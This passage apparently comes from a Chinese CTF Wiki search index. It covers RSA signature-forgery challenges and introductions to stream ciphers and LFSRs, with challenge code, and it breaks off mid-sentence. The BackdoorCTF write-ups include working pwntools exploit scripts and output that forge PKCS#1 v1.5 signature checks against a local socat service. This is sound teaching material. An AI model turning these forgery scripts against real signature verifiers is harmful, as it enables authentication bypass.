PKCS1_V1.5 \u8fdb\u884c\u4e86 RSA \u7b7e\u540d\uff0c\u8fd9\u4f1a\u5bf9\u660e\u6587\u6d88\u606f\u8fdb\u884c\u6269\u5c55\uff0c\u5177\u4f53\u6269\u5c55\u89c4\u5219\u8bf7\u53c2\u8003 https://www.emc.com/collateral/white-papers/h11300-pkcs-1v2-2-rsa-cryptography-standard-wp.pdf \u3002\u8fd9\u91cc\u7ed9\u51fa\u5bf9\u5e94\u6269\u5c55\u811a\u672c\uff0c\u5bf9\u5e94\u4e8e\u9898\u76ee\u4e2d\u7684 from Util import PKCS1_pad as pad def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( '00' + '01' + 'ff' * ( 1024 / 8 - n / 2 - 3 ) + '00' + ans ), 16 ) \u7a0b\u5e8f\u5e0c\u671b\u6211\u4eec\u7ed9\u51fa n,e \u4f7f\u5f97\u7a0b\u5e8f\u6ee1\u8db3 h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) \u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 h(m)\uff0cpad(m) \u3002\u663e\u7136\u5982\u679c\u6211\u4eec\u63a7\u5236 e=1 \u7684\u8bdd\uff0c\u90a3\u4e48 h(m)-pad(m)=kn h(m)-pad(m)=kn \u90a3\u4e48\u5982\u679c\u6211\u4eec\u53ef\u4ee5\u8bbe\u7f6e k=1\uff0c\u65e2\u53ef\u4ee5\u5f97\u5230 n\u3002 \u672c\u5730\u90e8\u7f72 socat TCP4-LISTEN:12345,fork EXEC:./mix1.py \u3002 exp \u5982\u4e0b from Crypto.Hash import SHA from pwn import * from Util import PKCS1_pad #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) e = 1 n = int ( signature , 16 ) - m p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () \u6548\u679c\u5982\u4e0b \u279c 2018 -BackdoorCTF-Awesome-mix1 git: ( master ) python exp.py [ + ] Opening connection to 127 .0.0.1 on port 12345 : Done [ * ] message: super important information for admin only [ * ] signature: 721af5bd401b5f2aff8e86bf811b827cdb5877ef12202f24fa914a26f235523f80c45fdbf0d3c9fa77278828ddd8ca0551a941bd57c97dd38654692568d1357a49e7a2a284d296508602ead24c91e5aa7f517b9e48422575f0dd373d00f267a206ba164ab104c488268b5f95daf490a048407773d4b1016de8ef508bf1aa678f [ * ] Switching to interactive mode CTF { cryp70_5ur3_15_w13rd } [ * ] Got EOF while reading in interactive","title":"2018 Backdoor Awesome mix1"},{"location":"crypto/signature/rsa/#2018-backdoor-awesome-mix2","text":"\u672c\u5730\u90e8\u7f72 socat TCP4-LISTEN:12345,fork EXEC:./service.py \u3002 \u9898\u76ee\u7c7b\u4f3c\u4e8e\u4e0a\u9762\u7684\u9898\u76ee\uff0c\u552f\u4e00\u7684\u533a\u522b\u5728\u4e8e\u5bf9\u4e8e e \u6709\u7ea6\u675f\uff0c\u5fc5\u987b\u5927\u4e8e 3\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528 1 \u4e86\u3002 h(m)^e mod \\ n=pad(m) h(m)^e mod \\ n=pad(m) \u8fd9\u91cc\u6211\u4eec\u5df2\u7ecf\u77e5\u9053 h(m)\uff0cpad(m) \u3002\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u5269\u4e0b\u7684\u6570\u5373\u53ef\uff0c\u8fd9\u91cc\u6211\u4eec\u6784\u9020 n \u4e3a\u7d20\u6570\uff0c\u4f7f\u5f97 n-1\u662f\u4e00\u4e2a\u5149\u6ed1\u6570\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4f7f\u7528 pohlig_hellman \u7b97\u6cd5\u4e86\u3002 from Crypto.Hash import SHA from pwn import * import gmpy2 from gmpy2 import is_prime import random def PKCS1_pad ( data ): asn1 = \"3021300906052b0e03021a05000414\" ans = asn1 + data n = len ( ans ) return int (( '00' + '01' + 'ff' * ( 1024 / 8 - n / 2 - 3 ) + '00' + ans ), 16 ) #context.log_level = 'debug' def gen_smooth_num ( plist , minnum = pow ( 2 , 1020 )): lenp = len ( plist ) while True : n = 1 factors = dict () while n + 1 < minnum : tmp = random . randint ( 0 , lenp - 1 ) n *= plist [ tmp ] if plist [ tmp ] in factors : factors [ plist [ tmp ]] += 1 else : factors [ plist [ tmp ]] = 1 if n . bit_length () > 1024 : continue if is_prime ( n + 1 ): return n + 1 , factors # http://pythonexample.com/snippet/pohligpy_neuratron_python # solve g^x=h mod m def log_prime_power ( g , h , pf , pe , M ): powers = [ pf ** k for k in range ( pe )] gamma = gmpy2 . powmod ( g , powers [ - 1 ], M ) xk = gmpy2 . mpz ( 0 ) for k in range ( pe ): if k == 0 : hk = gmpy2 . powmod ( h , powers [ pe - k - 1 ], M ) else : gk = gmpy2 . powmod ( g , xk * ( M - 2 ), M ) hk = gmpy2 . powmod ( gk * h , powers [ pe - k - 1 ], M ) k_log_found = False for dk in range ( pf ): yk = gmpy2 . powmod ( gamma , dk , M ) if yk == hk : k_log_found = True break if not k_log_found : raise Exception ( \"can not solve\" ) xk += gmpy2 . mul ( powers [ k ], dk ) return xk def pohlig_hellman ( g , h , M , factors ): M1 = M - 1 xs = [] for f in factors : pf = f pe = factors [ f ] subgroup_exponent = gmpy2 . div ( M1 , gmpy2 . powmod ( pf , pe , M )) gi = gmpy2 . powmod ( g , subgroup_exponent , M ) hi = gmpy2 . powmod ( h , subgroup_exponent , M ) xi = log_prime_power ( gi , hi , pf , pe , M ) xs . append ( xi ) crt_coeffs = [] for f in factors : pf = f pe = factors [ f ] mi = pf ** pe bi = gmpy2 . div ( M , mi ) bi_inv = gmpy2 . invert ( bi , mi ) crt_coeffs . append ( gmpy2 . mul ( bi , bi_inv )) x = 0 for i in range ( len ( crt_coeffs )): x = gmpy2 . t_mod ( x + gmpy2 . t_mod ( xs [ i ] * crt_coeffs [ i ], M1 ), M1 ) return x #context.log_level = 'debug' def main (): port = 12345 host = \"127.0.0.1\" p = remote ( host , port ) p . recvuntil ( 'Message -> ' ) message = p . recvuntil ( ' \\n\\n Signature -> ' , drop = True ) log . info ( 'message: ' + message ) signature = p . recvuntil ( ' \\n ' , drop = True ) log . info ( 'signature: ' + signature ) signature = int ( signature , 16 ) h = SHA . new ( message ) m = PKCS1_pad ( h . hexdigest ()) print m , signature plist = [] for i in range ( 2 , 1000 ): if is_prime ( i ): plist . append ( i ) while True : try : n , factors = gen_smooth_num ( plist , signature ) e = pohlig_hellman ( signature , m , n , factors ) except Exception as e : continue else : break print n , e print m print gmpy2 . powmod ( signature , e , n ) p . sendlineafter ( 'Enter n:' , str ( n )) p . sendlineafter ( 'Enter e:' , str ( e )) p . interactive () main () \u6709\u4e24\u70b9\u9700\u8981\u6ce8\u610f \u7531\u4e8e g^x=y g^x=y \u4e2d\u7684 g \u548c y \u90fd\u662f\u7ed9\u5b9a\u7684\uff0c\u6211\u4eec\u65b0\u627e\u5230\u7684 n\uff0c\u4e0d\u4e00\u5b9a g \u7684\u5e42\u6b21\u6784\u6210\u7684\u7fa4\u4f1a\u5305\u542b y\uff0c\u6240\u4ee5\u53ef\u80fd\u6c42\u89e3\u5931\u8d25\uff0c\u6240\u4ee5\u9700\u8981\u591a\u6b21\u6c42\u89e3\u3002 \u6e90\u4ee3\u7801\u4e2d\u867d\u7136 n.bit_length() <= 1025 \uff0c\u4f46\u662f\u5176\u5b9e n \u5728\u6ee1\u8db3\u4e0d\u5c0f\u4e8e signature \u7684\u6761\u4ef6\u65f6\uff0c\u5fc5\u987b\u6ee1\u8db3\u5982\u4e0b\u6761\u4ef6\uff08pycrypto \u6e90\u7801\uff09 modBits = Crypto . Util . number . size ( self . _key . n ) k = ceil_div ( modBits , 8 ) # Convert from bits to bytes # Step 1 if len ( S ) != k : return 0 \u6240\u4ee5\u6211\u4eec\u6700\u597d\u8bbe\u7f6e n \u4e3a1024 \u6bd4\u7279\u4f4d\u3002","title":"2018 Backdoor Awesome mix2"},{"location":"crypto/streamcipher/intro/","text":"\u6d41\u5bc6\u7801 \u00b6 \u6d41\u5bc6\u7801\u4e00\u822c\u9010\u5b57\u8282\u6216\u8005\u9010\u6bd4\u7279\u5904\u7406\u4fe1\u606f\u3002\u4e00\u822c\u6765\u8bf4 \u6d41\u5bc6\u7801\u7684\u5bc6\u94a5\u957f\u5ea6\u4f1a\u4e0e\u660e\u6587\u7684\u957f\u5ea6\u76f8\u540c\u3002 \u6d41\u5bc6\u7801\u7684\u5bc6\u94a5\u6d3e\u751f\u81ea\u4e00\u4e2a\u8f83\u77ed\u7684\u5bc6\u94a5\uff0c\u6d3e\u751f\u7b97\u6cd5\u901a\u5e38\u4e3a\u4e00\u4e2a\u4f2a\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6d41\u52a0\u5bc6\u76ee\u524d\u6765\u8bf4\u90fd\u662f\u5bf9\u79f0\u52a0\u5bc6\u3002 \u4f2a\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\u751f\u6210\u7684\u5e8f\u5217\u7684\u968f\u673a\u6027\u8d8a\u5f3a\uff0c\u660e\u6587\u4e2d\u7684\u7edf\u8ba1\u7279\u5f81\u88ab\u8986\u76d6\u7684\u66f4\u597d\u3002 \u6d41\u5bc6\u7801\u52a0\u89e3\u5bc6\u975e\u5e38\u7b80\u5355\uff0c\u5728\u5df2\u77e5\u660e\u6587\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u975e\u5e38\u5bb9\u6613\u5730\u83b7\u53d6\u5bc6\u94a5\u6d41\u3002 \u6d41\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u8bbe\u8ba1\u597d\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u57fa\u672c\u6784\u9020\u6a21\u5757\u4e3a\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u4e00\u4e9b\u7279\u6b8a\u8bbe\u8ba1\u7684\u6d41\u5bc6\u7801\uff0c\u6bd4\u5982 RC4\u3002","title":"\u4ecb\u7ecd"},{"location":"crypto/streamcipher/intro/#_1","text":"\u6d41\u5bc6\u7801\u4e00\u822c\u9010\u5b57\u8282\u6216\u8005\u9010\u6bd4\u7279\u5904\u7406\u4fe1\u606f\u3002\u4e00\u822c\u6765\u8bf4 \u6d41\u5bc6\u7801\u7684\u5bc6\u94a5\u957f\u5ea6\u4f1a\u4e0e\u660e\u6587\u7684\u957f\u5ea6\u76f8\u540c\u3002 \u6d41\u5bc6\u7801\u7684\u5bc6\u94a5\u6d3e\u751f\u81ea\u4e00\u4e2a\u8f83\u77ed\u7684\u5bc6\u94a5\uff0c\u6d3e\u751f\u7b97\u6cd5\u901a\u5e38\u4e3a\u4e00\u4e2a\u4f2a\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6d41\u52a0\u5bc6\u76ee\u524d\u6765\u8bf4\u90fd\u662f\u5bf9\u79f0\u52a0\u5bc6\u3002 \u4f2a\u968f\u673a\u6570\u751f\u6210\u7b97\u6cd5\u751f\u6210\u7684\u5e8f\u5217\u7684\u968f\u673a\u6027\u8d8a\u5f3a\uff0c\u660e\u6587\u4e2d\u7684\u7edf\u8ba1\u7279\u5f81\u88ab\u8986\u76d6\u7684\u66f4\u597d\u3002 \u6d41\u5bc6\u7801\u52a0\u89e3\u5bc6\u975e\u5e38\u7b80\u5355\uff0c\u5728\u5df2\u77e5\u660e\u6587\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u975e\u5e38\u5bb9\u6613\u5730\u83b7\u53d6\u5bc6\u94a5\u6d41\u3002 \u6d41\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u8bbe\u8ba1\u597d\u7684\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u4f2a\u968f\u673a\u6570\u751f\u6210\u5668\u7684\u57fa\u672c\u6784\u9020\u6a21\u5757\u4e3a\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u3002\u5f53\u7136\uff0c\u4e5f\u6709\u4e00\u4e9b\u7279\u6b8a\u8bbe\u8ba1\u7684\u6d41\u5bc6\u7801\uff0c\u6bd4\u5982 RC4\u3002","title":"\u6d41\u5bc6\u7801"},{"location":"crypto/streamcipher/fsr/intro/","text":"\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 \u00b6 \u4e00\u822c\u7684\uff0c\u4e00\u4e2a n \u7ea7\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u5982\u4e0b\u56fe\u6240\u793a \u5176\u4e2d a_0 a_0 \uff0c a_1 a_1 \uff0c\u2026\uff0c a_{n-1} a_{n-1} \uff0c\u4e3a\u521d\u6001\u3002 F \u4e3a\u53cd\u9988\u51fd\u6570\u6216\u8005\u53cd\u9988\u903b\u8f91\u3002\u5982\u679c F \u4e3a\u7ebf\u6027\u51fd\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u79f0\u5176\u4e3a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\uff0c\u5426\u5219\u6211\u4eec\u79f0\u5176\u4e3a\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08NFSR\uff09\u3002 a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) \u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u90fd\u4f1a\u5b9a\u4e49\u5728\u67d0\u4e2a\u6709\u9650\u57df\u4e0a\uff0c\u4ece\u800c\u907f\u514d\u6570\u5b57\u592a\u5927\u548c\u592a\u5c0f\u7684\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u540c\u4e00\u4e2a\u7a7a\u95f4\u4e2d\u7684\u53d8\u6362\uff0c\u5373 (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) \u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\u6765\u8bf4\uff0c\u6211\u4eec\u4e00\u822c\u5b9a\u4e49\u5176\u751f\u6210\u51fd\u6570\u4e3a\u5176\u5e8f\u5217\u5bf9\u5e94\u7684\u5e42\u7ea7\u6570\u7684\u548c\u3002","title":"\u4ecb\u7ecd"},{"location":"crypto/streamcipher/fsr/intro/#_1","text":"\u4e00\u822c\u7684\uff0c\u4e00\u4e2a n \u7ea7\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u5982\u4e0b\u56fe\u6240\u793a \u5176\u4e2d a_0 a_0 \uff0c a_1 a_1 \uff0c\u2026\uff0c a_{n-1} a_{n-1} \uff0c\u4e3a\u521d\u6001\u3002 F \u4e3a\u53cd\u9988\u51fd\u6570\u6216\u8005\u53cd\u9988\u903b\u8f91\u3002\u5982\u679c F \u4e3a\u7ebf\u6027\u51fd\u6570\uff0c\u90a3\u4e48\u6211\u4eec\u79f0\u5176\u4e3a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\uff0c\u5426\u5219\u6211\u4eec\u79f0\u5176\u4e3a\u975e\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08NFSR\uff09\u3002 a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) a_{i+n}=F(a_i,a_{i+1},...,a_{i+n-1}) \u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u90fd\u4f1a\u5b9a\u4e49\u5728\u67d0\u4e2a\u6709\u9650\u57df\u4e0a\uff0c\u4ece\u800c\u907f\u514d\u6570\u5b57\u592a\u5927\u548c\u592a\u5c0f\u7684\u95ee\u9898\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u89c6\u4e3a\u540c\u4e00\u4e2a\u7a7a\u95f4\u4e2d\u7684\u53d8\u6362\uff0c\u5373 (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) (a_i,a_{i+1},...,a_{i+n-1}) \\rightarrow (a_{i+1},...,a_{i+n-1},a_{i+n}) \u5bf9\u4e8e\u4e00\u4e2a\u5e8f\u5217\u6765\u8bf4\uff0c\u6211\u4eec\u4e00\u822c\u5b9a\u4e49\u5176\u751f\u6210\u51fd\u6570\u4e3a\u5176\u5e8f\u5217\u5bf9\u5e94\u7684\u5e42\u7ea7\u6570\u7684\u548c\u3002","title":"\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668"},{"location":"crypto/streamcipher/fsr/lfsr/","text":"\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668 - LFSR \u00b6 \u4ecb\u7ecd \u00b6 \u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u53cd\u9988\u51fd\u6570\u4e00\u822c\u5982\u4e0b a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} a_{i+n}=\\sum\\limits_{j=1}^{n}c_ja_{i+n-j} \u5176\u4e2d\uff0c c_j c_j \u5747\u5728\u67d0\u4e2a\u6709\u9650\u57df F_q F_q \u4e2d\u3002 \u65e2\u7136\u7ebf\u6027\u7a7a\u95f4\u662f\u4e00\u4e2a\u7ebf\u6027\u53d8\u6362\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5\u8fd9\u4e2a\u7ebf\u6027\u53d8\u6362\u4e3a \\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right] \\left[ \\begin{matrix} 0 & 0 & \\cdots & 0 & c_n \\\\ 1 & 0 & \\cdots & 0 & c_{n-1} \\\\ 0 & 1 & \\cdots & 0 & c_{n-2}\\\\\\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 & \\cdots & 1 & c_1 \\\\ \\end{matrix} \\right] \u8fdb\u800c\uff0c\u6211\u4eec\u53ef\u4ee5\u6c42\u5f97\u5176\u7279\u5f81\u591a\u9879\u5f0f\u4e3a f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i} f(x)=x^n-\\sum\\limits_{i=1}^{n}c_ix^{n-i} \u540c\u65f6\uff0c\u6211\u4eec\u5b9a\u4e49\u5176\u4e92\u53cd\u591a\u9879\u5f0f\u4e3a \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} \\overline f(x)=x^nf(\\frac{1}{x})=1-\\sum\\limits_{i=1}^{n}c_ix^{i} \u6211\u4eec\u4e5f\u79f0\u4e92\u53cd\u591a\u9879\u5f0f\u4e3a\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u8054\u7ed3\u591a\u9879\u5f0f\u3002 \u8fd9\u91cc\u6709\u4e00\u4e9b\u5b9a\u7406\u9700\u8981\u6211\u4eec\u8bb0\u4e00\u4e0b\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u63a8\u5bfc\u3002 \u7279\u5f81\u591a\u9879\u5f0f\u4e0e\u751f\u6210\u51fd\u6570 \u00b6 \u5df2\u77e5\u67d0\u4e2a n \u7ea7\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\u7684\u7279\u5f81\u591a\u9879\u5f0f\uff0c\u90a3\u4e48\u8be5\u5e8f\u5217\u5bf9\u5e94\u7684\u751f\u6210\u51fd\u6570\u4e3a A(x)=\\frac{p(x)}{\\overline f(x)} A(x)=\\frac{p(x)}{\\overline f(x)} \u5176\u4e2d\uff0c p(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1}) p(x)=\\sum\\limits_{i=1}^{n}(c_{n-i}x^{n-i}\\sum\\limits_{j=1}^{i}a_jx^{j-1}) \u3002\u53ef\u4ee5\u770b\u51fa p(x) \u5b8c\u5168\u7531\u521d\u59cb\u72b6\u6001\u548c\u53cd\u9988\u51fd\u6570\u7684\u7cfb\u6570\u51b3\u5b9a\u3002 \u5e8f\u5217\u5468\u671f\u4e0e\u751f\u6210\u51fd\u6570 \u00b6 \u5e8f\u5217\u7684\u7684\u5468\u671f\u4e3a\u5176\u751f\u6210\u51fd\u6570\u7684\u65e2\u7ea6\u771f\u5206\u5f0f\u7684\u5206\u6bcd\u7684\u5468\u671f\u3002 \u5bf9\u4e8e n \u7ea7\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff0c\u6700\u957f\u5468\u671f\u4e3a 2^{n-1} 2^{n-1} \uff08\u6392\u9664\u5168\u96f6\uff09\u3002\u8fbe\u5230\u6700\u957f\u5468\u671f\u7684\u5e8f\u5217\u4e00\u822c\u79f0\u4e3a m \u5e8f\u5217\u3002 \u7279\u6b8a\u6027\u8d28 \u00b6 \u5c06\u4e24\u4e2a\u5e8f\u5217\u7d2f\u52a0\u5f97\u5230\u65b0\u7684\u5e8f\u5217\u7684\u5468\u671f\u4e3a\u8fd9\u4e24\u4e2a\u5e8f\u5217\u7684\u5468\u671f\u7684\u548c\u3002 \u5e8f\u5217\u662f n \u7ea7 m \u5e8f\u5217\uff0c\u5f53\u4e14\u4ec5\u5f53\u5e8f\u5217\u7684\u6781\u5c0f\u591a\u9879\u5f0f\u662f n \u6b21\u672c\u539f\u591a\u9879\u5f0f\u3002 B-M \u7b97\u6cd5 \u00b6 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u4e24\u79cd\u89d2\u5ea6\u6765\u8003\u8651 LFSR \u5bc6\u94a5\u751f\u6210\u89d2\u5ea6\uff0c\u4e00\u822c\u6211\u4eec\u5e0c\u671b\u4f7f\u7528\u7ea7\u6570\u5c3d\u53ef\u80fd\u4f4e\u7684 LFSR \u6765\u751f\u6210\u5468\u671f\u5927\uff0c\u968f\u673a\u6027\u597d\u7684\u5e8f\u5217\u3002 \u5bc6\u7801\u5206\u6790\u89d2\u5ea6\uff0c\u7ed9\u5b9a\u4e00\u4e2a\u957f\u5ea6\u4e3a n \u7684\u5e8f\u5217 a\uff0c\u5982\u4f55\u6784\u9020\u4e00\u4e2a\u7ea7\u6570\u5c3d\u53ef\u80fd\u5c0f\u7684 LFSR \u6765\u751f\u6210\u5b83\u3002\u5176\u5b9e\u8fd9\u5c31\u662f B-M \u7b97\u6cd5\u7684\u6765\u6e90\u3002 \u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u5e8f\u5217\u7684\u7ebf\u6027\u590d\u6742\u5ea6\u5982\u4e0b \u82e5 s \u4e3a\u4e00\u4e2a\u5168\u96f6\u5e8f\u5217\uff0c\u5219\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a0\u3002 \u82e5\u6ca1\u6709 LFSR \u80fd\u751f\u6210 s\uff0c\u5219\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a\u65e0\u7a77\u3002 \u5426\u5219\uff0cs \u7684\u7ebf\u6027\u590d\u6742\u5ea6\u4e3a\u751f\u6210 L(s) \u7684\u6700\u5c0f\u7ea7\u7684 LFSR\u3002 BM \u7b97\u6cd5\u7684\u8981\u6c42\u6211\u4eec\u9700\u8981\u77e5\u9053\u957f\u5ea6\u4e3a 2n \u7684\u5e8f\u5217\u3002\u5176\u590d\u6742\u5ea6 \u65f6\u95f4\u590d\u6742\u5ea6\uff1aO(n^2) \u6b21\u6bd4\u7279\u64cd\u4f5c \u7a7a\u95f4\u590d\u6742\u5ea6\uff1aO(n) \u6bd4\u7279\u3002 \u5173\u4e8e BM \u7b97\u6cd5\u7684\u7ec6\u8282\uff0c\u540e\u7eed\u6dfb\u52a0\uff0c\u76ee\u524d\u5904\u4e8e\u5b66\u4e60\u8fc7\u7a0b\u4e2d\u3002 \u4f46\u662f\u5176\u5b9e\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u957f\u5ea6\u4e3a 2n \u7684\u5e8f\u5217\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4e00\u79cd\u6bd4\u8f83\u7b28\u7684\u65b9\u6cd5\u6765\u83b7\u53d6\u539f\u5148\u7684\u5e8f\u5217\u3002\u4e0d\u59a8\u5047\u8bbe\u5df2\u77e5\u7684\u5e8f\u5217\u4e3a a_1,...,a_{2n} a_1,...,a_{2n} \uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4 S_1=(a_1,...,a_n) S_1=(a_1,...,a_n) S_2=(a_2,...,a_{n+1}) S_2=(a_2,...,a_{n+1}) .... S_{n+1}=(a_{n+1},...,a_{2n}) S_{n+1}=(a_{n+1},...,a_{2n}) \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u77e9\u9635 X=(S_1,...,S_n) X=(S_1,...,S_n) \uff0c\u90a3\u4e48 S_{n+1}=(c_n,...,c_1)X S_{n+1}=(c_n,...,c_1)X \u6240\u4ee5 (c_n,...,c_1)=S_{n+1}X^{-1} (c_n,...,c_1)=S_{n+1}X^{-1} \u8fdb\u800c\u6211\u4eec\u4e5f\u5c31\u77e5\u9053\u4e86 LFSR \u7684\u53cd\u9988\u8868\u8fbe\u5f0f\uff0c\u8fdb\u800c\u6211\u4eec\u5c31\u53ef\u4ee5\u63a8\u51fa\u521d\u59cb\u5316\u79cd\u5b50\u3002 2018 \u5f3a\u7f51\u676f streamgame1 \u00b6 \u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee from flag import flag assert flag . startswith ( \"flag{\" ) assert flag . endswith ( \"}\" ) assert len ( flag ) == 25 def lfsr ( R , mask ): output = ( R << 1 ) & 0xffffff i = ( R & mask ) & 0xffffff lastbit = 0 while i != 0 : lastbit ^= ( i & 1 ) i = i >> 1 output ^= lastbit return ( output , lastbit ) R = int ( flag [ 5 : - 1 ], 2 ) mask = 0b1010011000100011100 f = open ( \"key\" , \"ab\" ) for i in range ( 12 ): tmp = 0 for j in range ( 8 ): ( R , out ) = lfsr ( R , mask ) tmp = ( tmp << 1 ) ^ out f . write ( chr ( tmp )) f . close () \u53ef\u4ee5\u53d1\u73b0\uff0cflag \u7684\u957f\u5ea6\u4e3a25-5-1=19\uff0c\u6240\u4ee5\u53ef\u4ee5\u66b4\u529b\u679a\u4e3e\u3002\u7ed3\u679c \u279c 2018 -\u5f3a\u7f51\u676f-streamgame1 git: ( master ) \u2717 python exp.py 12 0b1110101100001101011 \u56e0\u6b64 flag \u4e3a flag{1110101100001101011}\u3002 2018 CISCN \u521d\u8d5b oldstreamgame \u00b6 \u7b80\u5355\u770b\u4e00\u4e0b\u9898\u76ee flag = \"flag{xxxxxxxxxxxxxxxx}\" assert flag.startswith ( \"flag{\" ) assert flag.endswith ( \"}\" ) assert len ( flag )== 14 def lfsr ( R,mask ) : output = ( R << 1) & 0xffffffff i=(R&mask)&0xffffffff lastbit=0 while i!=0: lastbit^=(i&1 ) i = i>>1 output^ = lastbit return ( output,lastbit ) R = int ( flag [ 5 :-1 ] ,16 ) mask = 0b10100100000010000000100010010100 f = open ( \"key\" , \"w\" ) for i in range ( 100 ) : tmp = 0 for j in range ( 8 ) : ( R,out )= lfsr ( R,mask ) tmp =( tmp << 1 ) ^out f.write ( chr ( tmp )) f.close () \u7a0b\u5e8f\u5f88\u7b80\u5355\uff0c\u4ecd\u7136\u662f\u4e00\u4e2a LFSR\uff0c\u4f46\u662f\u521d\u6001\u662f 32 \u6bd4\u7279\u4f4d\uff0c\u5f53\u7136\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u9009\u62e9\u7206\u7834\uff0c\u4f46\u662f\u8fd9\u91cc\u4e0d\u9009\u62e9\u7206\u7834\u3002 \u8fd9\u91cc\u7ed9\u51fa\u4e24\u79cd\u505a\u6cd5\u3002 \u7b2c\u4e00\u79cd\u505a\u6cd5\uff0c\u7a0b\u5e8f\u8f93\u51fa\u7684\u7b2c 32 \u4e2a\u6bd4\u7279\u662f\u7531\u7a0b\u5e8f\u8f93\u51fa\u7684\u524d 31 \u4e2a\u6bd4\u7279\u548c\u521d\u59cb\u79cd\u5b50\u7684\u7b2c 1 